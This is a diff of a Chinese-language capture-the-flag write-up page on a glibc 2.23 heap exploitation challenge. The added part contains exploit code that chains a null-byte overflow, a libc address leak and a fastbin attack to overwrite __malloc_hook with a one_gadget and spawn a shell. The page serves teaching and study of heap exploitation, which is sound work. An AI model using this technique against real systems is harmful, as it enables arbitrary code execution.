@@ -1,12 +1,17 @@
 <div class="main">
 
-!@#$%__LIMITED_EXPERTISE__%$#@!
+__LIMITED_EXPERTISE__
 
 <p>本文记录一个简单的堆利用问题。</p>
 <p>附件：</p>
 <ul>
-	<li><a href="/tales-of-the-martyrs/tales/oracle-of-namagari/5/libc-2.23.so">🔗libc-2.23.so</a></li>
-	<li><a href="/tales-of-the-martyrs/tales/oracle-of-namagari/5/timu">🔗timu</a></li>
+	<li><a href="__ASSETS__/libc-2.23.so">🔗libc-2.23.so</a></li>
+	<li><a href="__ASSETS__/timu">🔗timu</a></li>
+</ul>
+
+<p>glibc源码：</p>
+<ul>
+	<li><a href="__ASSETS__/malloc.c">🔗malloc.c</a></li>
 </ul>
 
 <br>
@@ -217,7 +222,7 @@ do_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)
 
 <p>本题中通过选项1创建新的笔记，通过选项2删除笔记，选项3查看所有的笔记。</p>
 
-<p>然而，创建笔记的时候，我们可以将一个null字符溢出至下一个chunk中，因此我们可以将下一个chunk中的<code>PREV_INUSE</code>位覆盖为0。接下来，考虑对fastbin进行attack，其基本思想是构造如下的两个chunk：</p>
+<p>然而，创建笔记的时候，我们可以将一个null字符溢出至下一个chunk中，因此我们可以将下一个chunk中<code>size</code>的低八位覆盖为0，同时也会将<code>PREV_INUSE</code>位覆盖为0。接下来，考虑对fastbin进行攻击，其基本思想是构造如下的两个chunk：</p>
 
 <pre><code class="language-c">chunk_1 = malloc(0x68);
 chunk_2 = malloc(0x68);</code></pre>
@@ -273,7 +278,45 @@ chunk = malloc(0x68);</code></pre>
 <p>修改<code>chunk</code>即可实现任意地址写（arbitrary writing）。</p>
 <br>
 
-<p>然而，对于本题而言，修改chunk是做不到的，我们只能通过反复地<code>malloc</code>与<code>free</code>来利用漏洞。可以尝试通过覆盖<code>PREV_INUSE</code>位来触发<code>free</code>中的向前合并<comment>（malloc.c，4013~4018）</comment>与向后合并<comment>（malloc.c，4001~4007）</comment>的过程。</p>
+<p>然而，对于本题而言，修改chunk内容甚至于重复释放chunk是做不到的。我们可以尝试通过覆盖<code>PREV_INUSE</code>位来触发<code>free</code>中向前合并<comment>（malloc.c，4013~4018）</comment>与向后合并<comment>（malloc.c，4001~4007）</comment>的过程。关键步骤如下：</p>
+
+<pre><code class="language-python">create(0x108, b'A')    # <1>
+create(0x108, b'B')
+create(0x68, b'C')
+create(0x68, b'D')
+create(0x108, b'E'*0xf0+p64(0x100)+p64(0x11))
+delete(2)
+delete(3)
+delete(0)
+
+create(0x68, b'F'*0x60 + p64(0x300))    # <2>
+delete(4)
+create(0x108, b'G')
+show()
+p.recvuntil(b'1 : ')
+libc_base = u64(p.recv(6).ljust(8, b'\x00')) - (main_arena_offset + 88)
+
+create(0x128, b'H'*0x100 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))    # <3>
+create(0x68, b'I')
+create(0x68, b'\0'*(0xb+0x8) + p64(one_gadget))</code></pre>
+<br>
+
+<p>上述代码的<code>&lt;1&gt;</code>处构造了五个堆块，这样构造的目的将在后续的步骤中体现。需要特别注意的是在后续步骤中<code>E.size</code>的低字节将会被覆盖为0，故<code>E</code>的结尾需要伪造一个<code>PREV_INUSE</code>位以通过程序的检查<comment>（malloc.c，3985~3989）</comment>。</p>
+
+<p>在<code>&lt;2&gt;</code>处，<code>F</code>与<code>D</code>的地址重合，于是我们相当于向<code>E</code>的<code>size</code>中溢出了一个字节的<code>00</code>，释放<code>E</code>时与<code>0x300</code>字节以前的伪堆块——这个伪堆块刚好就是<code>A</code>——发生向前合并，此时合并后的堆块刚好在unsorted bin中。接下来从unsorted bin中切分出一个大小为<code>0x110</code>的chunk，此时从<code>B</code>中刚好可以读到加上了某个固定偏移后的libc基址。</p>
+
+<p>而在<code>&lt;3&gt;</code>处我们使用了fastbin attack来完成任意地址写，这里将伪造的堆块设置在<code>malloc_hook - 0x23</code>处以通过程序对该伪堆块的size检查<comment>（malloc.c，3383~3389）</comment>，最后将<code>malloc_hook</code>处的指针覆盖为<code>one_gadget</code>的地址，再次申请一个chunk即可拿到shell。</p>
+<br><br>
+
+<p>至于patch了其他同版本的libc后<code>one_gadget</code>坏掉了不能用的情况嘛……</p>
+
+<div class='center'>
+<img src="__ASSETS__/1.jpg" alt="我不到啊"></img>
+</div>
+
+
+
+
 
 
 
